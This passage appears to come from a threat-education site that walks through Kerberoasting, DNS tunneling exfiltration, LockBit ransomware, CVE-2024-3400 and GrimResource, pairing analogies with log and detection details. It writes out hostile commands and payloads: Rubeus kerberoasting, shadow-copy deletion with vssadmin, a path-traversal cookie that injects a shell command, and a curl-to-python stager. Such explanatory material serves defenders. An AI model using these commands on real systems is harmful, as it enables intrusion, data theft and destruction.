as NT AUTHORITY\SYSTEM.
- **MITRE ATT&CK Techniques**: T1558.003 (Steal or Forge Kerberos Tickets: Kerberoasting - Credential Access), T1550.002 (Use Alternate Authentication Material: Pass the Hash - Lateral Movement)
- **Primary Analytical Sources**: Microsoft Windows Security Auditing: Event ID 4769: A Kerberos service ticket was requested (RC4 0x17) (https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4769) | Microsoft Windows Security Auditing: Event ID 4624: An account was successfully logged on (LogonType 3) (https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4624) | NSA & CISA Cybersecurity Technical Guidance: Mitigating Kerberoasting and Active Directory Service Account Compromise (https://attack.mitre.org/techniques/T1558/003/)
- **Kill-Chain Stages**:
  - Stage 1 (T1558.003 · Steal or Forge Kerberos Tickets: Kerberoasting): **REQUEST RC4-DOWNGRADED KERBEROS TGS (EVENT 4769)** — The visitor opens the park’s public phonebook (LDAP), finds the SQL attraction run by a human manager (svc_mssql), and asks the central ticket booth (DC01.corp.local:88) for a voucher sealed with an older, fast-to-crack wax stamp (0x17 RC4-HMAC) instead of modern armor (AES-256). From the compromised workstation WS-FINANCE-04 (10.10.20.45) using standard domain account CORP\m.davis, the attacker runs Rubeus.exe (PID 3920, PPID 2104: Rubeus.exe kerberoast /spn:MSSQLSvc/sql01.corp.local:1433 /nowrap). After querying LDAP (TCP/389) on DC01.corp.local (10.10.1.5) via ldap_search_ext_s("(servicePrincipalName=*)") to locate MSSQLSvc/sql01.corp.local:1433, Rubeus sends a Kerberos TGS-REQ (TCP/88) with TicketOptions = 0x40810000 requesting encryption type 0x17 (RC4-HMAC, a legacy cipher that encrypts the ticket directly with svc_mssql’s NTLM password hash, making it thousands of times faster to brute-force offline than AES-256 / 0x12). By design in the Kerberos protocol, the Key Distribution Center (KDC) on DC01.corp.local (10.10.1.5) does not check whether CORP\m.davis has permission to log into SQL01; it immediately encrypts the KRB_TGS_REP service ticket using svc_mssql’s NTLM hash and returns the RC4 ciphertext to Rubeus.exe (PID 3920) on 10.10.20.45 (while logging Windows Security Event ID 4769 with Status = 0x0 and TicketEncryptionType = 0x17). On the diagram, follow Step #1 / Link #1 (#1→ TGS RC4 (0x17) / ⇠#1 ACK Event 4769) from Node ① (#1 Foothold Session (CORP\m.davis)) to Node ② (#2 Core L3 VLAN Switch), monitored by Node ⑥ (#6 SIEM Log Collector (Splunk)). [Specs: EVENT ID=Security Event ID 4769 (A Kerberos service ticket was requested); ENCRYPTION TYPE=0x17 (RC4-HMAC) — Anomaly vs 0x12 (AES256); SERVICE NAME=svc_mssql / MSSQLSvc/sql01.corp.local:1433]
  - Stage 2 (T1550.002 · Use Alternate Authentication Material: Pass the Hash): **OFFLINE CRACKING & SMB LOGON (EVENT 4624)** — Back in their private workshop, the attacker tests millions of candidate passwords per second against the sealed voucher ($krb5tgs$23$*) until the seal opens, and then walks straight up to the SQL Server’s administration door (SMB TCP/445) wearing the manager’s real badge (svc_mssql). The attacker exports the returned RC4 TGS ticket from WS-FINANCE-04 in $krb5tgs$23$* format and cracks it offline using Hashcat (-m 13100, generating zero failed-login alerts on DC01 because every guess runs locally on the attacker’s GPU). Once svc_mssql’s credential is recovered, the attacker initiates a lateral SMB2 network logon (TCP/445) from WS-FINANCE-04 (10.10.20.45) to the target database server SQL01.corp.local (10.10.5.20) using AuthenticationPackageName = NtLmSsp (which SQL01 accepts and records as Windows Security Event ID 4624 with LogonType = 3). Because svc_mssql was granted local administrator privileges on SQL01.corp.local (10.10.5.20), completing the NTLMSSP network authentication handshake over TCP/445 returns an authenticated administrative SMB session (granting read/write access to \\sql01.corp.local\ADMIN$ and the remote Service Control Manager pipe \\sql01.corp.local\pipe\svcctl). On the diagram, follow Step #2 / Link #2 (#2→ SMB LOGON (3) / ⇠#2 ACK Event 4624) from Node ② (#2 Core L3 VLAN Switch) to Node ⑤ (#5 DC01 (KDC) & SQL01.corp.local), monitored by Node ⑥ (#6 SIEM Log Collector (Splunk)). [Specs: LOGON EVENT=Security Event ID 4624 (LogonType = 3 Network); TARGET ACCOUNT=CORP\svc_mssql; SOURCE IP=10.10.20.45 (WS-FINANCE-04)]
  - Stage 3 (T1543.003 · Create or Modify System Process: Windows Service): **REMOTE SERVICE EXECUTION VIA PSEXEC (EVENT 7045)** — Now inside the SQL Server’s admin office, the intruder drops an automated worker (PSEXESVC.exe) into the building’s master service directory and tells the building controller (services.exe) to start it with full SYSTEM authority. Using the authenticated SMB session on SQL01.corp.local (10.10.5.20), the attacker uploads PSEXESVC.exe to \\sql01.corp.local\ADMIN$\PSEXESVC.exe and invokes CreateServiceW and StartServiceW on the remote Service Control Manager (services.exe, PID 628, PPID 512) to install and start a new Windows service named PSEXESVC (ImagePath = %SystemRoot%\PSEXESVC.exe). Windows logs System Event ID 7045 (A service was installed in the system) as services.exe (PID 628) spawns PSEXESVC.exe (PID 5190) under NT AUTHORITY\SYSTEM (completing privileged takeover of the database server). When PsExec calls StartServiceW over the svcctl RPC pipe, services.exe (PID 628) starts C:\Windows\PSEXESVC.exe (PID 5190) as LocalSystem (NT AUTHORITY\SYSTEM), which calls CreateNamedPipeW and CreateProcessAsUserW("cmd.exe") (returning an interactive SYSTEM command shell over encrypted SMB named pipes back to the operator on 10.10.20.45). On the diagram, follow Step #3 / Link #3 (#3→ NEW SERVICE / ⇠#3 ACK Event 7045) from Node ⑤ (#5 DC01 (KDC) & SQL01.corp.local) to Node ③ (#3 Finance Workstation (WS-FINANCE-04)), monitored by Node ⑥ (#6 SIEM Log Collector (Splunk)). [Specs: SYSTEM EVENT=Event ID 7045 (A service was installed in the system); SERVICE FILE=%SystemRoot%\PSEXESVC.exe (or cmd.exe /c ...); PRIVILEGE GAINED=NT AUTHORITY\SYSTEM on SQL01]

### T1071.004: DNS Tunneling C2 & High-Entropy Subdomain Data Exfiltration
- **Scenario ID**: `dns-tunneling-exfil`
- **Canonical URL**: https://attackexplorer.org/scenarios/dns-tunneling-exfil
- **Interactive Simulator URL**: https://attackexplorer.org/?scenario=dns-tunneling-exfil
- **Category**: NETWORK_WEB | **Severity**: HIGH
- **Subtitle**: Network & Log Analysis · Bypassing Egress Firewall via Recursive DNS
- **Overview**: Imagine a locked-down prison facility where inmates are forbidden from mailing letters or making outside phone calls, but they are allowed to ask the prison operator: "What is the phone number for [Company Name]?" The operator is required to call the outside directory to check. So the inmate asks: "What is the phone number for Secret-Blueprint-Page1-4a6f686e.evil-c2.net?" The prison operator faithfully reads that exact secret message out loud to the accomplice waiting at the evil-c2.net directory desk. Even in tightly locked-down networks where isolated servers cannot browse external websites directly (blocked by Egress Firewall dropping TCP 80/443), internal hosts still resolve domain names through an internal corporate DNS resolver. In this scenario (MITRE T1071.004 & T1048.003), the exfiltration implant sync_agent.exe (PID 4412, PPID 1900 under CORP\svc_backup) on isolated database backup host DB-BACKUP-02 (10.50.1.12) reads C:\Backups\customers_pii.csv, splits it into 48-byte chunks, hex-encodes each chunk into a high-entropy subdomain (<seq>.<hex_data>.c2.badactor-dns.net), and sends UDP/53 DNS TXT queries to the Internal DNS Resolver (10.50.1.53). Experiencing a 100% cache miss rate, 10.50.1.53 recursively forwards every query across the firewall to the attacker’s authoritative Name Server (ns1.badactor-dns.net at 45.133.1.99:53), which reassembles customers_pii.csv and replies with C2 commands inside DNS TXT records (TTL=0).
- **MITRE ATT&CK Techniques**: T1071.004 (Application Layer Protocol: DNS (DNS Tunneling C2) - Command and Control), T1048.003 (Exfiltration Over Alternative Protocol - Exfiltration)
- **Primary Analytical Sources**: IETF Network Working Group: RFC 1035: Domain Names — Implementation and Specification (https://datatracker.ietf.org/doc/html/rfc1035) | Microsoft Sysinternals: Sysmon Event ID 22: DNSEvent (DNS Query Logging) (https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon#event-id-22-dnsevent) | Palo Alto Networks Unit 42: DNS Tunneling: How DNS Can Be Abused by Malicious Actors (OilRig / APT34 Tradecraft) (https://unit42.paloaltonetworks.com/dns-tunneling-how-dns-can-be-abused-by-malicious-actors/)
- **Kill-Chain Stages**:
  - Stage 1 (T1048.003 · Exfiltration Over Unencrypted Non-C2 Protocol): **CHUNK & HEX-ENCODE STOLEN DATA INTO SUBDOMAINS** — Before speaking to the prison operator, the inmate shreds the stolen customer ledger (customers_pii.csv) into 48-byte strips and encodes every strip in hexadecimal letters and numbers so it looks like a valid subdomain lookup. On the isolated database host DB-BACKUP-02 (10.50.1.12, which has no direct internet access because the Egress Firewall blocks TCP ports 80 and 443), the implant C:\ProgramData\sync_agent.exe (PID 4412, running as CORP\svc_backup) calls ReadFile("customers_pii.csv"), slices each row into 48-byte chunks, hex-encodes the bytes (for example, turning "4102,john_smith,2065" into "343130322c6a6f686e5f736d6974682c32303635"), and calls DnsQuery_A(DNS_TYPE_TXT) to send a 112-byte UDP/53 DNS TXT query for 001.343130322c6a6f686e5f736d6974682c32303635.c2.badactor-dns.net to the Internal DNS Resolver (10.50.1.53:53). Standard DNS resolvers permit alphanumeric labels up to 63 characters per subdomain label. By hex-encoding 48-byte CSV chunks (producing a Shannon entropy of 4.48 bits/char compared to <3.2 for normal domain names) and querying the local corporate DNS resolver (10.50.1.53:53), sync_agent.exe (PID 4412) receives QueryStatus = 0 with QueryResults = "type: 16 ACK:001:NEXT;" (confirming chunk #001 was delivered and acknowledged so the loop can advance to chunk #002 after Sleep(150), while Sysmon Event ID 22 logs the query on the host). On the diagram, follow Step #1 / Link #1 (#1→ DNS TXT EXFIL / ⇠#1 ACK 112 B) from Node ③ (#3 Isolated Backup Host (DB-BACKUP-02)) to Node ④ (#4 sync_agent.exe (DNS Exfil Agent)), monitored by Node ⑥ (#6 Zeek DNS NDR & Sysmon EID 22). [Specs: SYSMON EVENT=Event ID 22 (DNSEvent - DNS Query); QUERY FORMAT=001.4a6f686e2c393831323030.c2.badactor-dns.net; SHANNON ENTROPY=4.48 bits/char (Normal domains < 3.2)]
  - Stage 2 (T1071.004 · Application Layer Protocol: DNS): **RECURSIVE RELAY THROUGH CORPORATE DNS SERVER** — The trusted internal prison operator (Internal DNS Resolver 10.50.1.53) checks their local binder, sees a 100% cache miss because every subdomain is a brand-new chunk of stolen data, and automatically calls the outside internet (45.133.1.99:53) to resolve it. Because every single query from DB-BACKUP-02 contains a unique hex-encoded chunk of stolen data in the subdomain label (guaranteeing a 100% DNS cache miss rate so the resolver can never answer from local cache), the Internal DNS Resolver (10.50.1.53) follows standard recursive DNS resolution and forwards the 164-byte UDP/53 TXT query across the Egress Firewall directly to the authoritative Name Server for badactor-dns.net (ns1.badactor-dns.net at 45.133.1.99:53). While the Egress Firewall blocks direct outbound connections from DB-BACKUP-02 (10.50.1.12), it permits outbound UDP/53 recursive queries originating from the corporate DNS server (10.50.1.53, which receives back the authoritative TXT answer "ACK:001:NEXT" with TTL = 0.000000 and records the 164-byte exchange in Zeek dns.log). On the diagram, follow Step #2 / Link #2 (#2→ RECURSIVE TXT / ⇠#2 RESP 164 B) from Node ④ (#4 sync_agent.exe (DNS Exfil Agent)) to Node ② (#2 Corp DNS Resolver & FW), monitored by Node ⑥ (#6 Zeek DNS NDR & Sysmon EID 22). [Specs: NETWORK LOG=Zeek dns.log / BIND query.log; CACHE MISS RATE=100% Unique Subdomains per parent domain; RECORD TYPE=TXT (qtype = 16) · TTL = 0]
  - Stage 3 (T1071.004 · Bidirectional DNS Tunneling C2): **REASSEMBLE EXFILTRATED DATA & RETURN TXT C2 COMMAND** — The accomplice sitting at the ns1.badactor-dns.net desk strips the hex code off every incoming question to rebuild customers_pii.csv, and replies with a DNS TXT answer (ACK:001:CMD:SLEEP_60) that rides all the way back to the implant. When the recursive query arrives at the attacker’s authoritative Name Server (ns1.badactor-dns.net, 45.133.1.99:53), the dnscat2/exfil daemon strips the .c2.badactor-dns.net suffix, hex-decodes chunk #001 back into plaintext CSV rows (customers_pii.csv), and sends back a 188-byte DNS TXT response (TXT "ACK:001:CMD:SLEEP_60" with TTL = 0 seconds so the corporate DNS server will not cache the answer). The Internal DNS Resolver (10.50.1.53) relays that 188-byte TXT answer right back to sync_agent.exe (PID 4412) on DB-BACKUP-02 (10.50.1.12). This completes a bidirectional covert channel over UDP/53: outbound data exfiltration rides inside the DNS query subdomain labels (QNAME), while inbound acknowledgments and C2 tasking (the 188-byte TXT "ACK:001:CMD:SLEEP_60" response with rcode = 0 NOERROR and TTL = 0) ride back inside the DNS TXT answer record to pace the implant’s exfiltration loop. On the diagram, follow Step #3 / Link #3 (#3→ TXT C2 ACK & CMD / ⇠#3 RESP 188 B) from Node ② (#2 Corp DNS Resolver & FW) to Node ① (#1 Attacker Authoritative DNS C2), monitored by Node ⑥ (#6 Zeek DNS NDR & Sysmon EID 22). [Specs: DNS ANSWER=TXT "ACK:001:CMD:SLEEP_60"; RESPONSE TTL=0 seconds (Prevents DNS caching); MITIGATION=DNS RPZ (Response Policy Zones) & Entropy Thresholding]

### T1486 / T1490: LockBit Ransomware Behavioral Analysis: VSS Wipe & Fast Encryption
- **Scenario ID**: `ransomware-shadow-wipe`
- **Canonical URL**: https://attackexplorer.org/scenarios/ransomware-shadow-wipe
- **Interactive Simulator URL**: https://attackexplorer.org/?scenario=ransomware-shadow-wipe
- **Category**: MALWARE | **Severity**: CRITICAL
- **Subtitle**: Malware & Log Analysis · Mutex Creation, WMI Shadow Copy Deletion & I/O Spike
- **Overview**: Imagine an extortionist who plans to put heavy padlocks on every filing cabinet in an office and demand a ransom for the keys. Before clicking a single padlock shut, the first thing they do is walk into the back storage room and shred every photocopy and backup microfilm reel (vssadmin delete shadows /all /quiet), so the office manager cannot simply ignore the padlocks and pull out yesterday’s copies. Before a ransomware payload encrypts a single user document on a Windows server, it performs "Inhibit System Recovery" (MITRE ATT&CK T1490). Windows automatically keeps point-in-time backup snapshots of files using the Volume Shadow Copy Service (VSS). This scenario traces how the LockBit 3.0 ransomware binary (C:\Windows\Temp\lb3_payload.exe, PID 5540, PPID 3100 under CORP\admin_srv) creates mutex Global\39481-LB3, spawns vssadmin.exe delete shadows /all /quiet (PID 5812, destroying all local VSS restore points so administrators cannot recover files for free) and bcdedit.exe /set {default} recoveryenabled No, and then executes multi-threaded intermittent AES-NI + RSA-2048 file encryption across D:\Shares\Finance\* (such as Q4_Budget.xlsx.lockbit) while dropping the 4.1 KB Restore-My-Files.txt ransom note.
- **MITRE ATT&CK Techniques**: T1490 (Inhibit System Recovery (vssadmin / wmic shadowcopy delete) - Impact), T1486 (Data Encrypted for Impact - Impact)
- **Primary Analytical Sources**: CISA / FBI / MS-ISAC Joint Advisory: Understanding Ransomware Threat Actors: LockBit 3.0 (AA23-165A) (https://www.cisa.gov/news-events/cybersecurity-advisories/aa23-165a) | Microsoft Learn & Sysinternals: Volume Shadow Copy Service (VSS) & Sysmon Event ID 1 / 11 (https://learn.microsoft.com/en-us/windows-server/storage/file-server/volume-shadow-copy-service) | The MITRE Corporation & Ransomware DFIR Research: MITRE ATT&CK T1486 & T1490: Intermittent File Encryption & Recovery Inhibition (https://attack.mitre.org/techniques/T1486/)
- **Kill-Chain Stages**:
  - Stage 1 (T1490 · Inhibit System Recovery): **INHIBIT SYSTEM RECOVERY VIA VSS DELETION** — The extortionist slips into the archive room with an administrator master key, orders the archive clerk (vssadmin.exe / vssvc.exe) to silently incinerate every backup snapshot on the shelves without asking for confirmation (/quiet), and disconnects the emergency recovery switch (bcdedit recoveryenabled No). Before encrypting a single document, the LockBit 3.0 payload (C:\Windows\Temp\lb3_payload.exe -pass a8f9102b, PID 5540, running with High/Administrator integrity under CORP\admin_srv after registering mutex Global\39481-LB3 and stopping backup services via ControlService) calls CreateProcessW to spawn C:\Windows\System32\vssadmin.exe delete shadows /all /quiet (PID 5812, where "delete shadows /all" instructs the Windows Volume Shadow Copy Service to permanently erase every local backup snapshot on the drive so the victim cannot restore clean files for free, and "/quiet" suppresses confirmation prompts). Immediately after, it runs bcdedit /set {default} recoveryenabled No to disable Windows Automatic Repair boot recovery. When vssadmin.exe delete shadows /all /quiet (PID 5812, PPID 5540) executes, it invokes IVssBackupComponents::DeleteSnapshots over COM to the Volume Shadow Copy service (vssvc.exe) to drop all copy-on-write shadow storage diff areas on the NTFS volume (because this pre-encryption step happens before file encryption starts, an EDR rule that kills parent PID 5540 the instant Sysmon Event ID 1 logs vssadmin delete shadows stops the ransomware before data loss occurs). On the diagram, follow Step #1 / Link #1 (#1→ DELETE SHADOWS / ⇠#1 ACK PID 5812) from Node ① (#1 Breached Admin RDP Jump-Host) to Node ② (#2 Datacenter Core Switch), monitored by Node ⑥ (#6 EDR Canary Guard & SOC SIEM). [Specs: COMMAND LINE=vssadmin.exe delete shadows /all /quiet; MITRE ID=T1490 (Inhibit System Recovery); DEFENSE WINDOW=Pre-encryption stage — Kill parent PID 5540 immediately]
  - Stage 2 (T1486 · Data Encrypted for Impact): **MULTI-THREADED INTERMITTENT FILE ENCRYPTION** — With every backup copy destroyed and the emergency recovery switch disabled, the crew fans out across every floor using high-speed power tools to lock only the front latch (first 64 KB) of every filing cabinet in seconds, taping a ransom note (Restore-My-Files.txt) onto every desk. With local recovery paths eliminated, lb3_payload.exe (PID 5540) uses Windows I/O Completion Ports (an asynchronous multi-threaded disk subsystem that saturates all CPU cores at once) and Intermittent Encryption, encrypting only the first 64 KB of each file on D:\Shares\Finance\* (such as renaming Q4_Budget.xlsx to Q4_Budget.xlsx.lockbit via MoveFileExW) using hardware-accelerated AES-256-NI + RSA-2048 session key wrapping (destroying each file’s 64 KB header so thousands of files are locked in seconds before defenders can react), and writes the 4.1 KB ransom note D:\Shares\Finance\Restore-My-Files.txt in every directory. Full-file encryption on multi-gigabyte databases takes minutes and generates sustained disk I/O spikes that behavioral anti-ransomware minifilters easily spot. Encrypting only the first 64 KB header via MoveFileExW(*.lockbit) and dropping the 4.1 KB Restore-My-Files.txt note ruins file structures at a fraction of the I/O cost (triggering Sysmon Event ID 11 FileCreate alerts and EDR canary file tripwires that isolate the host). On the diagram, follow Step #2 / Link #2 (#2→ RANSOM NOTE / ⇠#2 ACK 4.1 KB) from Node ② (#2 Datacenter Core Switch) to Node ③ (#3 Target File Server (FILE-SRV-01)), monitored by Node ⑥ (#6 EDR Canary Guard & SOC SIEM). [Specs: SYSMON EVENT=Event ID 11 (FileCreate: Restore-My-Files.txt); ENCRYPTION MODE=Intermittent (First 64 KB per file + RSA footer); EDR RESPONSE=Minifilter blocks WriteFile & terminates PID 5540]

### CVE-2024-3400: Unit 42 — Operation MidnightEclipse: PAN-OS GlobalProtect RCE & UPSTYLE Backdoor
- **Scenario ID**: `unit42-panos-midnight-eclipse`
- **Canonical URL**: https://attackexplorer.org/scenarios/unit42-panos-midnight-eclipse
- **Interactive Simulator URL**: https://attackexplorer.org/?scenario=unit42-panos-midnight-eclipse
- **Category**: NETWORK_WEB | **Severity**: CRITICAL
- **Subtitle**: Palo Alto Unit 42 · CVE-2024-3400 Telemetry Cron Injection & system.pth Persistence
- **Overview**: Imagine a hotel front desk where any guest can hand the clerk a luggage tag (SESSID cookie). The clerk simply uses the guest’s tag name to create an empty note file in a back-office folder, and once every minute, a night janitor reads every filename in that folder out loud into the building’s master Intercom system (bash -c). By writing a file path and a shell command inside the luggage tag itself, the attacker tricks the front desk into planting a booby-trapped filename that the janitor executes with full master-key privileges. Synthesizing independent investigations from Volexity (who discovered the zero-day campaign as UTA0218), Palo Alto Networks Unit 42 (Operation MidnightEclipse), and Rapid7 AttackerKB, CVE-2024-3400 is a critical (CVSS 10.0) unauthenticated command injection flaw in PAN-OS GlobalProtect. The attacker chains two distinct bugs: (1) an arbitrary file-creation flaw in the SESSID HTTP cookie (../../../../opt/panlogs/tmp/device_telemetry/minute/..., using "../" directory traversal to plant a 0-byte file inside the privileged telemetry queue folder) and (2) a shell command-injection flaw when the root-privileged dt_curl / sendTelemetry cron job passes that filename into a backtick-evaluated shell command, allowing the attacker to implant the UPSTYLE Python backdoor in system.pth and steal running-config.xml.
- **MITRE ATT&CK Techniques**: T1190 (Exploit Public-Facing Application (PAN-OS GlobalProtect CVE-2024-3400) - Initial Access), T1059.006 (Command and Scripting Interpreter: Python (UPSTYLE Backdoor) - Execution / Persistence)
- **Primary Analytical Sources**: Palo Alto Networks Unit 42: Threat Brief: Operation MidnightEclipse, Post-Exploitation Activity Related to CVE-2024-3400 (https://unit42.paloaltonetworks.com/cve-2024-3400/) | Volexity Threat Research: Zero-Day Exploitation of Unauthenticated Remote Code Execution Vulnerability in GlobalProtect (CVE-2024-3400) (https://www.volexity.com/blog/2024/04/12/zero-day-exploitation-of-unauthenticated-remote-code-execution-vulnerability-in-globalprotect-cve-2024-3400/) | Palo Alto Networks PSIRT & Rapid7 AttackerKB: CVE-2024-3400 PAN-OS: Arbitrary File Creation Leads to OS Command Injection in GlobalProtect (https://security.paloaltonetworks.com/CVE-2024-3400)
- **Kill-Chain Stages**:
  - Stage 1 (T1190 · Exploit Public-Facing Application): **SESSID COOKIE PATH TRAVERSAL (CVE-2024-3400)** — The intruder walks up to the GlobalProtect VPN check-in window and presents a forged SESSID luggage tag that starts with ../../../../, forcing the session clerk to place an empty file directly inside the root janitor’s "To-Do" folder, with a shell command disguised as the filename itself. The attacker sends an unauthenticated HTTPS POST request to /ssl-vpn/hipreport.esp (the Host Information Profile endpoint on the GlobalProtect VPN portal, which is reachable from the internet before a user finishes logging in). Instead of a normal session ID, the Cookie: SESSID= header contains ../../../../opt/panlogs/tmp/device_telemetry/minute/aacurl ... | sh (where the "../" path traversal climbs out of the session folder into the firewall’s telemetry queue directory, and the backticks ... embed a Linux shell command directly inside the filename itself). When GlobalProtect processes hipreport.esp, its session serializer calls fopen() using the raw SESSID cookie value as the file path without stripping "../" sequences (creating an empty 0-byte file on disk, which is all the attacker needs, because the exploit payload lives inside the file’s name, not its contents). On the diagram, follow Step #1 / Link #1 (#1→ SESSID TRAVERSAL / ⇠#1 RESP HTTP 200) from Node ① (#1 UTA0218 Threat Actor) to Node ② (#2 DMZ Reverse Proxy & SPAN Tap), monitored by Node ⑥ (#6 Unit 42 / Cortex XDR SIEM). [Specs: VULNERABILITY=CVE-2024-3400 (CVSS 10.0 Unauthenticated RCE); HTTP HEADER=Cookie: SESSID=/../../../opt/panlogs/tmp/device_telemetry/minute/; TARGET DAEMON=gpsvc / sslvpnd on TCP 443]
  - Stage 2 (T1059.004 · Command and Scripting Interpreter: Unix Shell): **TELEMETRY CRON SHELL EXECUTION (DT_CURL)** — Sixty seconds later, the automated root janitor (dt_curl) walks into the telemetry folder to upload files, reads the booby-trapped filename out loud inside a shell command without quotation marks, and accidentally runs the attacker’s script as root. Once every minute, the PAN-OS device telemetry cron job (dt_curl / sendTelemetry, a scheduled background script running with full uid=0(root) privileges) loops through every file in /opt/panlogs/tmp/device_telemetry/minute/ and pastes each filename directly into a shell command string without escaping special characters. When the Linux shell parses that command string, it sees the backticks (curl ... | sh, which in Bash/sh means "execute the command inside these backticks first and substitute its output"), immediately running the attacker’s payload as root. Because the attacker never needed to write data into the file, only control its filename via the Step 1 path traversal, even a 0-byte file in the minute/ telemetry folder triggers unauthenticated root Remote Code Execution the next time the cron job ticks. In the documented Auditd SYSCALL 59 exchange from DMZ Reverse Proxy & SPAN Tap to PAN-OS GlobalProtect Edge, PAN-OS GlobalProtect Edge responds with ACK UID 0 (root) (confirming that the CRON RCE (ROOT) request succeeded on PAN-OS GlobalProtect Edge and establishing the runtime state required for Step #3 UPSTYLE PYTHON .PTH PERSISTENCE & LOG C2). On the diagram, follow Step #2 / Link #2 (#2→ CRON RCE (ROOT) / ⇠#2 ACK UID 0 (root)) from Node ② (#2 DMZ Reverse Proxy & SPAN Tap) to Node ③ (#3 PAN-OS GlobalProtect Edge), monitored by Node ⑥ (#6 Unit 42 / Cortex XDR SIEM). [Specs: CRON SCRIPT=dt_curl (Device Telemetry Minute Job); STAGER URL=curl -s http://198.51.100.77/update.py | python3; EXECUTION CONTEXT=uid=0(root) gid=0(root)]
  - Stage 3 (T1546.016 · Event Triggered Execution: Installer Packages / Python .pth): **UPSTYLE PYTHON .PTH PERSISTENCE & LOG C2** — Now holding the building’s master key, the intruder copies the master blueprint (running-config.xml), slips an auto-start hook into Python’s startup list (system.pth), installs a hidden listener inside the hotel’s public stylesheet file (bootstrap.min.css), and sets a timer that wipes the security logs the moment a command finishes. Combining Volexity’s and Unit 42’s forensic findings: with root access on the firewall, the attacker steals /opt/pancfg/mgmt/saved-configs/running-config.xml (the master PAN-OS configuration file containing VPN pre-shared keys, administrator hashes, and internal network routes used by UTA0218 to pivot into internal Windows Domain Controllers via SMB/winexe) and injects the UPSTYLE Python backdoor into /usr/lib/python3.6/site-packages/system.pth (a Python path-configuration file that Python automatically executes every time any system script starts on the appliance). UPSTYLE monitors /var/log/pan/sslvpn_ngx_error.log for crafted HTTPS requests and writes command output into /var/appweb/sslvpndocs/global-protect/portal/css/bootstrap.min.css (the public CSS stylesheet of the VPN login page, letting the attacker read command results over port 443). When the attacker sends a specially formatted HTTPS request with a bogus URL that logs an error into sslvpn_ngx_error.log, the background UPSTYLE inotify daemon parses the embedded Base64 command, appends the output inside a CSS comment /*...*/ in bootstrap.min.css, and 15 seconds later restores the original CSS file and deletes the offending log line (erasing both the command and output traces). On the diagram, follow Step #3 / Link #3 (#3→ SYSTEM.PTH HOOK / ⇠#3 ACK 4,128 Bytes) from Node ③ (#3 PAN-OS GlobalProtect Edge) to Node ④ (#4 UPSTYLE Python Backdoor), monitored by Node ⑥ (#6 Unit 42 / Cortex XDR SIEM). [Specs: PERSISTENCE FILE=/usr/lib/python3.6/site-packages/system.pth; C2 TRIGGER REGEX=img\[([a-zA-Z0-9+/=]+)\] in sslvpn-access.log; EXFIL & CLEANUP=Writes output to bootstrap.min.css + restores running.bak]

### T1218.014: Elastic Security Labs — GrimResource: MMC & apds.dll XSS-to-RCE Execution
- **Scenario ID**: `elastic-grimresource-msc`
- **Canonical URL**: https://attackexplorer.org/scenarios/elastic-grimresource-msc
- **Interactive Simulator URL**: https://attackexplorer.org/?scenario=elastic-grimresource-msc
- **Category**: MALWARE | **Severity**: HIGH
- **Subtitle**: Elastic Security Labs · Crafted .MSC Console File, apds.dll Redirect & DotNetToJScript
- **Overview**: Imagine a company that banned employees from opening .exe packages, but still trusts official-looking "Settings Binder" files (.msc) opened by the built-in Windows Management Console (mmc.exe). The attacker hides a legacy 1990s self-running gadget (apds.dll XSS) inside a Settings Binder; when opened, mmc.exe automatically runs the hidden script inside its own trusted process. Synthesizing research from Elastic Security Labs (who discovered "GrimResource" in June 2024), MDSec (DotNetToJScript), and Microsoft MSRC (CVE-2024-43572), this technique achieves arbitrary code execution inside Windows Management Console (mmc.exe, the signed Microsoft binary used for Event Viewer and Device Manager) when a user opens a crafted Microsoft Saved Console (.msc) file. By abusing a cross-site scripting (XSS) flaw in the legacy Windows apds.dll library (res://apds.dll/redirect.html, which blindly executes javascript: URLs inside mmc.exe’s HTML view) together with DotNetToJScript (deserializing a .NET assembly directly in RAM via BinaryFormatter) and RwSection injection into dllhost.exe, the attacker runs Cobalt Strike inside a trusted system process.
- **MITRE ATT&CK Techniques**: T1218.014 (System Binary Proxy Execution: MMC (GrimResource) - Defense Evasion), T1055 (Process Injection (RwSection Injection into dllhost.exe) - Defense Evasion / Privilege Escalation)
- **Primary Analytical Sources**: Elastic Security Labs: GrimResource — Microsoft Management Console for Initial Access and Evasion (https://www.elastic.co/security-labs/grimresource) | Microsoft Security Response Center (MSRC): CVE-2024-43572: Microsoft Management Console (MMC) Remote Code Execution Vulnerability (https://msrc.microsoft.com/update-guide/vulnerability/CVE-2024-43572) | The MITRE Corporation: MITRE ATT&CK T1218.014: System Binary Proxy Execution — MMC (https://attack.mitre.org/techniques/T1218/014/)
- **Kill-Chain Stages**:
  - Stage 1 (T1218.014 · System Binary Proxy Execution: MMC): **MMC PARSES CRAFTED .MSC & LOADS APDS.DLL** — The employee double-clicks an administrative binder (invoice_audit.msc). Inside the binder’s cover page (StringTables), a hidden reference tells the Windows Management Console to open an ancient help-viewer page (res://apds.dll/redirect.html) that blindly executes whatever script is written in its target parameter. The victim double-clicks a weaponized console file (invoice_audit.msc, an XML-based Windows Management Console file used to bypass email and browser blocks on .exe and .lnk files), which Windows automatically opens using the trusted system binary C:\Windows\System32\mmc.exe. Inside the .msc XML structure, the <StringTables> section points an embedded HTML panel to res://C:\Windows\System32\apds.dll/redirect.html?target=javascript:eval(...) (abusing an ancient HTML page baked inside Microsoft’s own apds.dll library that blindly passes its "target=" parameter into a browser redirect, CVE-2024-43572, immediately executing the attacker’s VBScript/JavaScript inside mmc.exe). C:\Windows\System32\apds.dll (the legacy Microsoft Help Center library shipped on every Windows installation) contains an embedded resource (redirect.html) that passes the target query parameter directly to document.location.replace() without sanitizing javascript: or vbscript: URI schemes, giving the .msc file full script execution inside mmc.exe’s privileged MSHTML Zone. On the diagram, follow Step #1 / Link #1 (#1→ LOAD APDS.DLL / ⇠#1 ACK Signed MS DLL) from Node ① (#1 Malicious .MSC Delivery) to Node ② (#2 Perimeter Firewall & NDR Tap), monitored by Node ⑥ (#6 Elastic Defend & SIEM). [Specs: PROXY BINARY=C:\Windows\System32\mmc.exe (T1218.014); XSS GADGET=res://apds.dll/redirect.html?target=javascript:...; IMAGE LOADS=Sysmon EID 7: apds.dll + jscript.dll + vbscript.dll]
